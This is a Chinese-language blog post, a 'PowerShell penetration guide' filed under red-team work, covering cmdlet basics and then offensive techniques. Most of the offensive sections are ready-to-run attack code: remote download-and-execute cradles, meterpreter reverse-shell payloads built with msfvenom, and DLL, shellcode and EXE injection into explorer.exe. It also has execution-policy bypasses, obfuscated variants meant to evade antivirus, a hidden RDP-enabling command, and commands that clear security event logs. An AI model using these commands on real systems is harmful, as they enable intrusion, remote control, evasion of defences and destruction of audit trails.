<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic%7CRoboto+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"l0n9w4y.cc","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.13.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="本文研究Powershell攻击技术及利用框架渗透指南..">
<meta property="og:type" content="article">
<meta property="og:title" content="PowerShell渗透指南">
<meta property="og:url" content="https://l0n9w4y.cc/posts/11156/index.html">
<meta property="og:site_name" content="L0n9w4y">
<meta property="og:description" content="本文研究Powershell攻击技术及利用框架渗透指南..">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-05-04T13:36:45.000Z">
<meta property="article:modified_time" content="2022-10-19T15:40:29.225Z">
<meta property="article:author" content="L0n9w4y">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="PowerShell">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://l0n9w4y.cc/posts/11156/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/11156/","path":"posts/11156/","title":"PowerShell渗透指南"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>PowerShell渗透指南 | L0n9w4y</title>
  






  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">L0n9w4y</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-攻防"><a href="/security/" rel="section"><i class="fa fa-navicon fa-fw"></i>攻防</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D"><span class="nav-text">0x01 基础介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E8%BF%9B%E9%98%B6%E6%8A%80%E6%9C%AF"><span class="nav-text">0x02 进阶技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-WMI%E6%8A%80%E6%9C%AF"><span class="nav-text">1. WMI技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF"><span class="nav-text">2. 注入技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF"><span class="nav-text">3. 混淆技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%97%A5%E5%BF%97%E6%93%8D%E4%BD%9C"><span class="nav-text">4. 日志操作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6"><span class="nav-text">0x03 利用框架</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-PowerSploit"><span class="nav-text">1. PowerSploit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Find-AVSignature"><span class="nav-text">Find-AVSignature</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CodeExecution"><span class="nav-text">CodeExecution</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exfiltration"><span class="nav-text">Exfiltration</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Persistence"><span class="nav-text">Persistence</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Privesc"><span class="nav-text">Privesc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Recon"><span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ScriptModification"><span class="nav-text">ScriptModification</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Nishang"><span class="nav-text">2. Nishang</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Empire"><span class="nav-text">3. Empire</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="L0n9w4y"
      src="/images/hexo.png">
  <p class="site-author-name" itemprop="name">L0n9w4y</p>
  <div class="site-description" itemprop="description">攻防对抗，問道遠兮，求索未止...</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">36</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">35</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/L0n9w4y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0n9w4y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/l0n9w4y" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;l0n9w4y" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/_L0n9_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;_L0n9_" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/11156/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hexo.png">
      <meta itemprop="name" content="L0n9w4y">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L0n9w4y">
      <meta itemprop="description" content="攻防对抗，問道遠兮，求索未止...">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="PowerShell渗透指南 | L0n9w4y">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          PowerShell渗透指南
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-05-04 21:36:45" itemprop="dateCreated datePublished" datetime="2022-05-04T21:36:45+08:00">2022-05-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">红队渗透</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <center>本文研究Powershell攻击技术及利用框架渗透指南..</center>

<span id="more"></span>
<hr>
<p>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途…</p>
<h2 id="0x01-基础介绍"><a href="#0x01-基础介绍" class="headerlink" title="0x01 基础介绍"></a>0x01 基础介绍</h2><p><strong>cmdlet查询</strong></p>
<pre class="language-none"><code class="language-none">1）Get-Verb：返回大多数命令遵循的谓词的列表。响应包括有关这些谓词的功能的说明。

2）Get-Command：检索计算机上安装的所有命令的列表。

    a. 使用不同的参数筛选 Get-Command 的输出：Get-Command -Name &#39;*Process&#39;  &#x2F;&#x2F;除了 -Name 之外，还可以根据 -ParameterName 和 -Type 之类的内容进行筛选

    b. 根据名词和谓词进行筛选：Get-Command -Verb &#39;Get&#39;   &#x2F;&#x2F;指定 -Verb 作为参数，列出谓词部分为 Get 的所有命令

    c. 根据名词进行筛选：Get-Command -Noun U*    &#x2F;&#x2F;指定 -Noun 作为参数和字符串参数

    d. 谓词&#x2F;名词组合使用：Get-Command -Verb Get -Noun U*

    e. Select-Object：帮助你从一个或多个对象中选取特定属性，如：Get-Command | Select-Object -First 3  &#x2F;&#x2F;获取从顶部往下数的前3个命令

    f. Where-Object：帮助你根据属性值从集合中选择对象，如：Get-Process | Where-Object &#123;$_.ProcessName -like &quot;p*&quot;&#125;  &#x2F;&#x2F;查找ProcessName 以 p 开头的所有 process 对象

3）Get-Member：它在基于对象的输出上运行，并且能够发现可用于命令的对象、属性和方法。

    Get-Process | Get-Member  &#x2F;&#x2F;结果显示返回的类型（以 TypeName 形式）以及对象的所有属性和方法

    Get-Process | Get-Member -MemberType Method   &#x2F;&#x2F;使用 -MemberType 参数，可以指定要查看所有方法

    Get-Process | Get-Member | Select-Object Name, Definition  &#x2F;&#x2F;使用 Select-Object，可以指定要查看哪些列

4）Get-Help：以命令名称为参数调用此命令，将显示一个帮助页面，其中说明了命令的各个部分。</code></pre>

<p><strong>执行策略</strong></p>
<p>PowerShell 执行策略是一项安全功能，用于控制 PowerShell 加载配置文件和运行脚本的条件</p>
<table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">AllSigned</td>
<td align="left">AllSigned 执行策略允许执行所有具有数字签名的脚本，运行已签名但恶意脚本存在风险</td>
</tr>
<tr>
<td align="left">Restricted</td>
<td align="left">Windows 客户端计算机的默认执行策略；受限制的，可以执行单个命令，但是不能执行脚本；绕过限制：Set-ExecutionPolicy -ExecutionPolicy Bypass</td>
</tr>
<tr>
<td align="left">RemoteSigned</td>
<td align="left">Windows 服务器计算机的默认执行策略；当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行；不需要对在本地计算机上编写的脚本进行数字签名</td>
</tr>
<tr>
<td align="left">Unrestricted</td>
<td align="left">非 Windows 计算机的默认执行策略，无法更改；允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示</td>
</tr>
<tr>
<td align="left">Bypass</td>
<td align="left">Bypass 执行策略不阻止任何操作，并且没有任何警告或提示</td>
</tr>
<tr>
<td align="left">Undefined</td>
<td align="left">Undefined 表示当前范围内没有设置执行策略。如果所有范围内的执行策略为 Undefined，会应用默认的脚本策略。</td>
</tr>
<tr>
<td align="left">Default</td>
<td align="left">设置默认执行策略，Restricted 适用于 Windows 客户端，RemoteSigned适用于 Windows 服务器。</td>
</tr>
</tbody></table>
<p><strong>绕过安全策略</strong></p>
<pre class="language-none"><code class="language-none">1）获取当前执行策略

Get-ExecutionPolicy

2) 设置Bypass策略

Set-ExecutionPolicy -ExecutionPolicy Bypass

3）通过管道输入进入ps

Get-Content .\test.ps1 | powershell.exe -noprofile -

4）通过远程下载脚本来绕过

powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.169.10.1&#x2F;test.ps1&#39;)&quot;

5）通过BASE64编码执行

$command &#x3D; &quot;Write-Host &#39;Hello World!&#39;&quot;
$bytes &#x3D; [System.Text.Encoding]::Unicode.GetBytes($command) 
$encodedCommand &#x3D; [Convert]::ToBase64String($bytes) 
powershell.exe -EncodedCommand $encodedCommand</code></pre>

<p><strong>通过CMD执行powershell</strong></p>
<pre class="language-none"><code class="language-none">PowerShell[.exe]
       [-PSConsoleFile &lt;file&gt; | -Version &lt;version&gt;]
       [-EncodedCommand &lt;Base64EncodedCommand&gt;]
       [-ExecutionPolicy &lt;ExecutionPolicy&gt;]
       [-File &lt;filePath&gt; &lt;args&gt;]
       [-InputFormat &#123;Text | XML&#125;] 
       [-NoExit]
       [-NoLogo]
       [-NonInteractive] 
       [-NoProfile] 
       [-OutputFormat &#123;Text | XML&#125;] 
       [-Sta]
       [-WindowStyle &lt;style&gt;]
       [-Command &#123; - | &lt;script-block&gt; [-args &lt;arg-array&gt;]
                     | &lt;string&gt; [&lt;CommandParameters&gt;] &#125; ]

PowerShell[.exe] -Help | -? | &#x2F;?


-Command            # 需要执行的代码
-ExecutionPolicy    # 设置默认的执行策略，一般使用Bypass
-EncodedCommand     # 执行Base64代码
-File               # 需要执行的脚本名
-NoExit             # 执行完成命令之后不会立即退出，运行完之后还会继续停留在PS的界面
-NoLogo             # 不输出PS的Banner信息
-Noninteractive     # 不开启交互式的会话
-NoProfile          # 不使用当前用户使用的配置文件
-Sta                # 以单线程模式启动ps
-Version            # 设置用什么版本去执行代码
-WindowStyle        # 设置Powershell的执行窗口，有如下参数Normal, Minimized, Maximized, or Hidden</code></pre>

<p><strong>常用命令</strong></p>
<pre class="language-none"><code class="language-none">1) 版本&#x2F;执行策略查看

    $PSVersionTable  # 查看版本
    Get-ExecutionPolicy  #检查当前执行策略
    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned   # 将PowerShell 执行策略更改为远程签名

2）开启PS远程访问

    # Enable psremoting
    Enable-PSRemoting

    # Add remote host to trusted hosts:
    Set-Item wsman:\localhost\client\trustedhosts 10.0.0.2
    Test-WsMan 10.0.0.2 # test connection to remote host

    # Check current remote session&#39;s permissions
    Get-PSSessionConfiguration | Format-Table -Property Name, Permission -Auto
    Set-PSSessionConfiguration -Name Microsoft.ServerManager -AccessMode Remote -Force

    # Open remote session
    Enter-PSSession -ComputerName 10.0.0.2 -Credential Domain\Username -Authentication Default
    $SS &#x3D; New-PSSession -ComputerName 10.0.0.2 -Credential Domain\Username -Authentication Default
    Get-PSSession Remove-PSSession
    Invoke-Command -Session $SS -ScriptBlock &#123;Get-Culture&#125;
    Enter&#x2F;New-PSSession -SkipCACheck -SkipCNCheck -UseSSL

    # Disable remoting in powershell
    Disable-PSRemoting
    Stop-Service winrm
    Set-Service -Name winrm -StartupType Disabled

3）创建 BITS 传输作业

    # Import-Module BitsTransfer
    Start-BitsTransfer -Priority Foreground -Source &quot;https:&#x2F;&#x2F;nmap.org&#x2F;ncrack&#x2F;dist&#x2F;*.tar.gz&quot; -Destination &quot;C:\temp\&quot;

    $Cred &#x3D; Get-Credential
    Start-BitsTransfer -Authentication ntlm -Credential $Cred -Priority Foreground -Source &quot;\\192.168.1.51\a\test.txt&quot; -Destination &quot;C:\temp\test.txt&quot;

4）获取补丁

    get-hotfix | out-gridview

5）安全描述符SDDL操作

    $sddl &#x3D; &quot;D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;SO)(A;;CCLCSWRPLORC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;LS)(A;;CCLCSWRPWPDTLOCRRC;;;NS)&quot;
    $ACLObject &#x3D; New-Object -TypeName System.Security.AccessControl.DirectorySecurity
    $ACLObject.SetSecurityDescriptorSddlForm($sddl)
    $ACLObject.Access

6）创建凭据

    # get credentials interactive
    $creds &#x3D; Get-Credential

    # non-interactive
    $secpasswd &#x3D; ConvertTo-SecureString &quot;PlainTextPassword&quot; -AsPlainText -Force
    $creds &#x3D; New-Object System.Management.Automation.PSCredential (&quot;username&quot;, $secpasswd)

7）开启&#x2F;关闭RDP

    RDP开启：powershell.exe -w hidden -nop -c &quot;reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f; if($?) &#123;$null &#x3D; netsh firewall set service type &#x3D; remotedesktop mod &#x3D; enable;$null &#x3D; reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&quot; &#x2F;v UserAuthentication &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f &#125;&quot;

    RDP关闭: powershell.exe -w hidden -nop -c &quot;reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f; if ($?) &#123; $null &#x3D; reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&quot; &#x2F;v UserAuthentication &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f &#125;&quot;</code></pre>

<h2 id="0x02-进阶技术"><a href="#0x02-进阶技术" class="headerlink" title="0x02 进阶技术"></a>0x02 进阶技术</h2><h3 id="1-WMI技术"><a href="#1-WMI技术" class="headerlink" title="1. WMI技术"></a>1. WMI技术</h3><p><strong>常用类</strong></p>
<pre class="language-none"><code class="language-none">主机&#x2F;操作系统信息:Win32_OperatingSystem, Win32_ComputerSystem
文件&#x2F;目录列举: CIM_DataFile
磁盘卷列举: Win32_Volume
注册表操作: StdRegProv
运行进程: Win32_Process
服务列举: Win32_Service
事件日志: Win32_NtLogEvent
登录账户: Win32_LoggedOnUser
共享: Win32_Share
已安装补丁: Win32_QuickFixEngineering</code></pre>

<p><strong>powershell-wmi</strong></p>
<pre class="language-none"><code class="language-none">Get-WmiObject -Query &quot;select * from win32_service where name&#x3D;&#39;WinRM&#39;&quot;

Get-WmiObject -Class Win32_Process | Where-Object &#123;$_.name -like &quot;*explorer*&quot;&#125;

Get-Wmiobject -query &quot;select * from win32_service where name&#x3D;&#39;WinRM&#39;&quot; -computername server01, server02

Get-WmiObject -Class Win32_QuickFixEngineering</code></pre>

<p><strong>WMI触发器</strong></p>
<pre class="language-none"><code class="language-none">事件触发条件

1) 事件筛选器：描述事件并且执行WQL事件查询。

2）事件消费者：事件消费是一个派生自 __EventConsumer 系统类的类，它表示了在事件触发时的动作。常用的消费类有下面两个： 
    a. ActiveScriptEventConsumer - 执行嵌入的 VBScript 或 JScript 脚本 payload 
    b. CommandLineEventConsumer - 执行一个命令行程序

3）消费者绑定筛选器：将筛选器绑定到消费者的注册机制。</code></pre>

<h3 id="2-注入技术"><a href="#2-注入技术" class="headerlink" title="2. 注入技术"></a>2. 注入技术</h3><p><strong>DLL注入</strong></p>
<p>DLL注入就是将代码插入&#x2F;注入到正在运行的进程中的过程，注入的代码是动态链接库（DLL）的形式。因为DLL（如UNIX中的共享库）是在运行时根据需要来进行加载，实际上还可以使用其他各种形式（任何PE文件、shellcode&#x2F;assembly等）来”注入”代码</p>
<p><strong>Bypass UAC</strong></p>
<pre class="language-none"><code class="language-none">1) 使用wusa.exe

2) Dll劫持

3) IFileOperation-COM对象
推荐注入explorer.exe这样的进程，只要操作系统在运行，这个进程能稳定的让我们注入</code></pre>

<p><strong>Powershell-DLL注入</strong></p>
<p>Powersploit中的Invoke-DllInjection已经完成对于DLL注入的利用，利用过程如下：</p>
<pre class="language-none"><code class="language-none">1) 利用IEX下载脚本

IEX(New-Object Net.WebClient).DownloadString(&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;CodeExecution&#x2F;Invoke-DllInjection.ps1&quot;)

2) 使用MSF生成恶意DLL

msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http LHOST&#x3D;192.168.168.1 LPORT&#x3D;8080 -f dll -o test.dll

3) 通过Ps加载DLL完成利用

查看一个我们当前用户能注入的进程，在这里选用explorer进程来进行注入

Get-Process -name &quot;explorer&quot; | Select-Object Id

Invoke-DllInjection -ProcessID 3628 -DLL .\test.dll</code></pre>

<p><strong>Powershell-ShellCode注入</strong></p>
<p>使用powersploit代码:Invoke-Shellcode 进行shellcode注入，利用过程如下：</p>
<pre class="language-none"><code class="language-none">1) 利用IEX下载脚本

IEX(New-Object Net.WebClient).DownloadString(&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;)

2) 使用MSF生成恶意代码

msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http LHOST&#x3D;192.168.168.1 LPORT&#x3D;8080 -f powershell -o test

通过Web下载的方式来导入shellcode

IEX(New-Object Net.WebClient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.168.1&#x2F;test&quot;)

3) 通过Ps加载shellcode完成利用

Invoke-Shellcode -Shellcode ($buf)    # 注入到当前powershell进程

Invoke-Shellcode -Shellcode ($buf) -ProcessID 2366  # 注入到指定进程(需判断是否有权限)</code></pre>

<p><strong>Powershell-EXE注入</strong></p>
<p>使用脚本<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">Invoke-ReflectivePEInjection</a>直接注入EXE文件，注入步骤：</p>
<pre class="language-none"><code class="language-none">1) 生成msf木马

msfvenom -p windows&#x2F;x64&#x2F;meterpreter_reverse_tcp -e -i 3 LHOST&#x3D;192.168.168.1 LPORT&#x3D;2333 -f exe -o ~&#x2F;shell.exe

2) 通过下面的注入

$PEBytes &#x3D; [IO.File]::ReadAllBytes(&#39;.\Desktop\powershell\shell.exe&#39;)
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR</code></pre>

<h3 id="3-混淆技术"><a href="#3-混淆技术" class="headerlink" title="3. 混淆技术"></a>3. 混淆技术</h3><p>远程下载代码脚本执行</p>
<pre class="language-none"><code class="language-none">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.0.1&#x2F;powershell&quot;)</code></pre>

<p>混淆方式</p>
<pre class="language-none"><code class="language-none">1) 去掉System关键字 

Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.0.1&#x2F;powershell&quot;)

2) 使用字符串连接+号连接 

Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;ht&quot;+&quot;tp:&#x2F;&#x2F;192.168.0.1&#x2F;powershell&quot;)

3) 使用Invoke方法 

Invoke-Expression (New-Object Net.WebClient).(&quot;DownloadString&quot;).Invoke(&#39;h&#39;+&#39;ttp:&#x2F;&#x2F;192.168.0.1&#x2F;powershell&#39;) $ds&#x3D;&quot;Down&quot;+&quot;loadString&quot;;Invoke-Expression (New-Object Net.WebClient).$ds.Invoke(&#39;h&#39;+&#39;ttp:&#x2F;&#x2F;192.168.0.1&#x2F;powershell&#39;)

4) 变量替代 

IEX $test&#x3D;New-Object Net.WebClient;$test.DownloadString(&#39;h&#39;+&#39;ttp:&#x2F;&#x2F;192.168.0.1&#x2F;powershell&#39;)

5) 关键字+单双引号 

Invoke-Expression (New-Object Net.WebClient).&quot;DownloadString&quot;(&#39;h&#39;+&#39;ttp:&#x2F;&#x2F;192.168.0.1&#x2F;powershell&#39;)

6) 转义符号 

Invoke-Expression (New-Object Net.WebClient).&quot;D&#96;o&#96;wn&#96;l&#96;oad&#96;Str&#96;in&#96;g&quot;(&#39;h&#39;+&#39;ttp:&#x2F;&#x2F;7ell.me&#x2F;power&#39;)

7) 字符串反转

$re&#x3D; &quot;)&#39;1&#x2F;1.0.0.721&#x2F;&#x2F;:ptth&#39;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;;
IEX ($re[-1..-($re.Length)] -Join &#39;&#39;) | IEX

8) 编码执行

$command &#x3D; &quot;Write-Host ‘Hello World!’&quot;
$bytes &#x3D; [System.Text.Encoding]::Unicode.GetBytes($command) 
$encodedCommand &#x3D; [Convert]::ToBase64String($bytes) 
powershell.exe -EncodedCommand $encodedCommand

9) 替代IEX

Invoke-Expression&#x2F;IEX命令是很常用的一个命令， 运行一个以字符串形式提供的PowerShell表达式。可代替IEX的各种执行方式

    a. &amp;(GAL I*X) : 通过别名的方式来进行编码
    b. Command I*e-E* : 通过command的方式来进行编码
    c. $ExecutionContext.InvokeCommand.GetCmdlets(&#39;I*e-E*&#39;)使用环境变量等等</code></pre>

<p><em>tools:</em> <a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
<h3 id="4-日志操作"><a href="#4-日志操作" class="headerlink" title="4. 日志操作"></a>4. 日志操作</h3><p><strong>CmdLet命令</strong></p>
<pre class="language-none"><code class="language-none">Clear-EventLog

Get-EventLog

Get-WinEvent

Limit-EventLog

New-EventLog

Remove-EventLog

Show-EventLog

Write-EventLog</code></pre>

<p><strong>日志查看</strong></p>
<pre class="language-none"><code class="language-none">列出事件日志列表: Get-Eventlog -List

查看security日志: Get-Eventlog -LogName security

列出最近日志: Get-EventLog -LogName security -Newest 5

列出指定时间段内的日志: Get-EventLog -LogName security -After 2020-11-10 -Before 2020-11-15

根据事件ID列出日志: Get-EventLog -LogName security -InstanceId 4624

获取某一条事件日志: Get-EventLog -LogName system -Index 12324</code></pre>

<p><strong>日志清除</strong></p>
<pre class="language-none"><code class="language-none">1）Remove-Eventlog：注销事件源

Remove-EventLog -LogName security  # 仅注销事件源，不删除日志

Remove-EventLog -Source app  # 注销事件源，app将无法写入事件日志

2）Clear-Eventlog：清除日志

Clear-Eventlog -LogName security  # 清除安全相关日志

Clear-Eventlog -LogName security -computername localhost, Server02  # 直接远程删除日志</code></pre>

